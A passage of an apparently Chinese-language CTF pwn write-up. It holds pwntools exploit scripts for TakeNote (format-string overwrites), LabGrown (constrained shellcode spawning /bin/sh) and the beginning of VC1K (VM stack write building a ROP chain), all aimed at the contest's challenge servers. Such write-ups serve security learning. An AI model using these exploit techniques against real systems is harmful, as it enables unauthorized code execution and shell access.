style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%30578c</span><span style="color:#C98A7D">%14$hnaaa</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"%</span><span style="color:#4d9375">{</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">ogg </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 16</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffff</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">c%19$hn"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%30580c</span><span style="color:#C98A7D">%14$hnaaa</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"%</span><span style="color:#4d9375">{</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">ogg </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">c%19$hhn"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">%30581c</span><span style="color:#C98A7D">%14$hnaaa</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    write</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"%</span><span style="color:#4d9375">{</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">ogg </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 40</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">c%19$hhn"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#4D9375">while</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">takenote.kctf-453514-codelab.kctf.cloud</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1337</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    except</span><span style="color:#666666">:</span><br></code></pre></div>
<h2 id="labgrown" class="scroll-target"><a href="#labgrown"><code class="hash inline-code">#</code>LabGrown</a></h2>
<p>shellcode 题，核心就是 shellcode 构造，这里主要是赛后和出题人交流了一下，出题人给了一个 fuzz trick（我赛时就是完全手搓试出来的）</p>
<blockquote>
<p>At a high level you have a few target operations,  say if you want to setup <code class="inline-code">execve(/bin/sh)</code> you need to get rdi set with the right value, rax to 0x3b, and make sure rsi &amp; rdx are 0. This challenge made linking operations difficult with its xor and even/odd constraints, but it wasn't too hard to find valid instructions in isolation that did what you wanted, like in my case a gadget like <code class="inline-code">mov al, 0x3b</code>, and we weren't super length constrained, so to link gadgets I just iterated through all possible sequences of 1,2, or 3 bytes between gadgets, checking first if they would allow our payload to met the jail constraints, then disassembling them along with the payload to see if the instruction was valid x86 and a 'no-op' with respect to the constraints I needed for the syscall, then actually running it to see if it didn't break.</p>
</blockquote>
<p>以上是出题人的原话，但是 t1d 说 fuzz 没啥用（</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./chal_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">labgrown.kctf-453514-codelab.kctf.cloud</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1337</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b *0x40142b</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> gen</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B07D48"> end</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">, </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#998418">len</span><span style="color:#1e754f">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">)</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#1e754f">]</span><span style="color:#AB5959"> ^</span><span style="color:#393A34"> res</span><span style="color:#1e754f">[</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"idx: </span><span style="color:#1e754f">{</span><span style="color:#393A34">i</span><span style="color:#1e754f">}</span><span style="color:#B56959">, </span><span style="color:#1e754f">{</span><span style="color:#393A34">res</span><span style="color:#a65e2b">[</span><span style="color:#393A34">i</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">}</span><span style="color:#B56959">, </span><span style="color:#1e754f">{</span><span style="color:#393A34">res</span><span style="color:#a65e2b">[</span><span style="color:#393A34">i</span><span style="color:#AB5959">+</span><span style="color:#2F798A">1</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">read </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">push r14</span><br><span style="color:#B56959">gs</span><br><span style="color:#B56959">inc ax</span><br><span style="color:#B56959">push r14</span><br><span style="color:#B56959">gs</span><br><span style="color:#B56959">inc ax</span><br><span style="color:#B56959">push rdi</span><br><span style="color:#B56959">pop rsi</span><br><span style="color:#B56959">std</span><br><span style="color:#B56959">nop</span><br><span style="color:#B56959">mov edx, ecx</span><br><span style="color:#B56959">pop rdi</span><br><span style="color:#B56959">pop rax</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">read</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x90</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> asm</span><span style="color:#1e754f">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">sh</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./chal_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">labgrown.kctf-453514-codelab.kctf.cloud</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1337</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b *0x40142b</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> gen</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#BD976A"> end</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">, </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">)</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">]</span><span style="color:#CB7676"> ^</span><span style="color:#DBD7CAEE"> res</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#4C9A91"> 1</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"idx: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">, </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">res</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#d4976c">]</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">, </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">res</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">]</span><span style="color:#4d9375">}</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">read </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">push r14</span><br><span style="color:#C98A7D">gs</span><br><span style="color:#C98A7D">inc ax</span><br><span style="color:#C98A7D">push r14</span><br><span style="color:#C98A7D">gs</span><br><span style="color:#C98A7D">inc ax</span><br><span style="color:#C98A7D">push rdi</span><br><span style="color:#C98A7D">pop rsi</span><br><span style="color:#C98A7D">std</span><br><span style="color:#C98A7D">nop</span><br><span style="color:#C98A7D">mov edx, ecx</span><br><span style="color:#C98A7D">pop rdi</span><br><span style="color:#C98A7D">pop rax</span><br><span style="color:#C98A7D77">"""</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">read</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x90</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">shellcraft</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sh</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="vc1k" class="scroll-target"><a href="#vc1k"><code class="hash inline-code">#</code>VC1K</a></h2>
<p>vm pwn，栈上任意地址写，和 HFCTF2022 Pwn avm 比较像，不需要泄漏 libc，可以把 <code class="inline-code">pop_rdi_ret</code> <code class="inline-code">binsh</code> <code class="inline-code">system</code> 都在栈上算好。</p>
<p>偏移可以直接输进去，用功能三的那个条件跳转跳过去。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/bin/python3</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">INFO</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">remotinator</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">vsplit</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">-x</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">'</span><br><br><br><span style="color:#393A34">process_name </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">./chal_patched</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">process_name</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><span style="color:#A65E2B">HOST</span><span style="color:#999999"> =</span><span style="color:#B5695977"> "</span><span style="color:#B56959">vc1k.kctf-453514-codelab.kctf.cloud</span><span style="color:#B5695977">"</span><br><span style="color:#A65E2B">PORT</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 1337</span><br><br><span style="color:#A0ADA0">######################################################################################</span><br><br><span style="color:#A0ADA0"># breakrva [-h] [offset] [module]</span><br><span style="color:#A0ADA0"># aslr [-h] [{off,on}]</span><br><span style="color:#393A34">gdb_script </span><span style="color:#999999">=</span><span style="color:#AB5959"> f</span><span style="color:#B56959">'''</span><br><span style="color:#B56959">#set breakpoint pending on</span><br><span style="color:#B56959">#breakrva 0x1277</span><br><span style="color:#B56959">#breakrva 0x14a4</span><br><span style="color:#B56959">#breakrva 0x13a7</span><br><span style="color:#B56959">#b *run+368</span><br><span style="color:#B56959">b *run+786</span><br><span style="color:#B56959">continue</span><br><span style="color:#B56959">'''</span><br><br><span style="color:#A0ADA0">######################################################################################</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> connect</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#A65E2B">REMOTE</span><span style="color:#999999">:</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[*] Connecting to </span><span style="color:#1e754f">{</span><span style="color:#A65E2B">HOST</span><span style="color:#1e754f">}</span><span style="color:#B56959"> : </span><span style="color:#1e754f">{</span><span style="color:#A65E2B">PORT</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">HOST</span><span style="color:#999999">,</span><span style="color:#A65E2B"> PORT</span><span style="color:#999999">,</span><span style="color:#B07D48"> ssl</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">elif</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#A65E2B">GDB</span><span style="color:#999999">:</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'[*] Debugging </span><span style="color:#1e754f">{</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#1e754f">}</span><span style="color:#B56959">.'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">debug</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B07D48"> gdbscript</span><span style="color:#999999">=</span><span style="color:#393A34">gdb_script</span><span style="color:#999999">,</span><span style="color:#B07D48"> aslr</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">else</span><span style="color:#999999">:</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'[*] Executing </span><span style="color:#1e754f">{</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#1e754f">}</span><span style="color:#B56959">.'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">path</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">return</span><span style="color:#393A34"> p</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> opcode_add</span><span style="color:#2993a3">(</span><span style="color:#393A34">op1Idx</span><span style="color:#999999">,</span><span style="color:#393A34"> op2Idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">opcode </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 13</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">op1Idx 